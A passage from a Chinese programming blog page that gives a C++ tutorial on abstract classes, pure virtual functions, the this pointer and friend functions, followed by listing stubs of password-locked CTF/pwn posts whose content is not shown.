<p>如果单纯的看纯虚函数，感觉这样做似乎没有什么意义。但事实上纯虚函数是为抽象类来服务的，如果一个类中包含了纯虚函数，那么这个类就是抽象类，<strong>抽象类无法被创建对象，它的作用是为其他类提供一个基类</strong>，假如有一个抽象类 <code>Animal</code> ，它定义了一个纯虚函数 <code>makeSound</code> ，之后我们可以创建比如 <code>cat</code> <code>dog</code> 这样的派生类，这样我去每个具体的派生类里面来实现 <code>makeSound</code>。你可以将抽象类理解为某些事物必有的一些特性，而具体的特性又会根据事物的不同而要重新定义，就比如刚刚提到的 <code>makeSound</code> ，在动物中一定都可以发出声音，但是每个动物发出的声音都不一样，因此我们先定义一个抽象类，至于每个动物发出的声音在具体的派生类中再去实现。</p>
<p>下面写一个抽象类与纯虚函数的代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;Wang&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;miao&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Animal *p=<span class="keyword">new</span> <span class="built_in">dog</span>();</span><br><span class="line">	p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">	p=<span class="keyword">new</span> <span class="built_in">cat</span>();</span><br><span class="line">	p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061628111.png" alt="image-20230106162845748"></p>
<h3 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h3><p><code>this</code> 指针是类中成员函数的一个隐含参数，每个对象都可以通过 <code>this</code> 指针来访问自己的地址。</p>
<p>这个主要一个用处是可以区分类中的成员和函数局部变量，假如有如下代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_x</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			x=x;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;x is &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">		&#125;	</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	a.<span class="built_in">set_x</span>(<span class="number">60</span>);</span><br><span class="line">	a.<span class="built_in">output_x</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常来说，我们的本意是希望赋值给类中的成员 <code>x</code> ，但是在 <code>set_x</code> 函数中x进行赋值的时候，程序认为是赋值给函数中的局部变量 <code>x</code> 。所以去输出成员变量 <code>x</code> 的时候就发生了错误，如下运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061748632.png" alt="image-20230106174845468"></p>
<p>因此这里我们想强调赋值的是给类中的成员变量 <code>x</code>，就可以写成 <code>this-&gt;x</code>，此时的运行结果就会正常（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061752361.png" alt="image-20230106175223292"></p>
<p><strong>注意：只有在类的成员函数内部才能使用 <code>this</code> ，在其他函数中使用 <code>this</code> 是无效的</strong></p>
<h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><p>上面提到，如果某个成员变量用 <code>private</code> 进行了修饰，那么就得通过类中定义的公有函数来进行访问，但是有这样一种特殊的函数，<strong>它在类中声明</strong>，具体的定义在类的外面，最关键的是它拥有访问私有（ <code>pritvate</code> ）成员和受保护（<code>protected</code>）成员的特性。这样的函数就叫做<strong>友元函数</strong></p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> price;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_price</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;price is &quot;</span> &lt;&lt; price &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a.price=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	<span class="built_in">set_price</span>(a,<span class="number">30</span>);<span class="comment">//不需要声明a对象调用了set_price函数</span></span><br><span class="line">	a.<span class="built_in">output_price</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061935757.png" alt="image-20230106193519661"></p>
<p>可以看见上面的代码中，我并没有在定义的部分写成 <code>A::set_price(A&amp; a,int n)</code>，但依然可以访问到类 <code>A</code> 中的属性。但要注意的是， <code>set_price</code> 函数传参的时候，要提供对象 <code>a</code> 的引用，如果这里仅仅是传递进去了对象 <code>a</code> 那么修改的只是 <code>a</code> 的副本，并没有对原本的实例造成任何改变（函数的参数如果直接传递的是对象，那么仅仅是拷贝一个副本进去）。</p>
<p>关于友元函数有几点需要注意：</p>
<ol>
<li>友元函数不是类的成员函数，因此不能使用类的示例成员访问符 <code>.</code> 或成员指针运算符 <code>-&gt;</code> 来调用友元函数，同样因为这个原因，友元函数也没有 <code>this</code> 指针。</li>
<li>友元函数的声明只能出现在类的定义中，而不能出现在类的实现中。</li>
<li>友元函数可以访问类的所有成员，包括私有成员和公有成员以及受保护成员，因此友元函数不受类的访问控制的限制。</li>
</ol>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hengyunabc/article/details/7773449">https://blog.csdn.net/hengyunabc/article/details/7773449</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/marvie_xie/article/details/79042654">(44条消息) C++学习笔记一：cout如何判断输入数据类型_marvie_xie的博客-CSDN博客_c++判断输入数据类型</a></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/cplusplus/cpp-overloading.html">C++ 重载运算符和重载函数 | 菜鸟教程 (runoob.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/e0e031bd.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/e0e031bd.html" class="post-title-link" itemprop="url">关于条件竞争的一道pwn题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:54:02" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/e0e031bd.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ded1a676.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ded1a676.html" class="post-title-link" itemprop="url">通过创建的线程开启shell绕过沙箱</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:55" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/ded1a676.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/8179f351.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/8179f351.html" class="post-title-link" itemprop="url">关于popal指令的一道pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:44" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/8179f351.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/3eb93c75.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/3eb93c75.html" class="post-title-link" itemprop="url">爆破canary+反弹shell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:32" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/3eb93c75.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
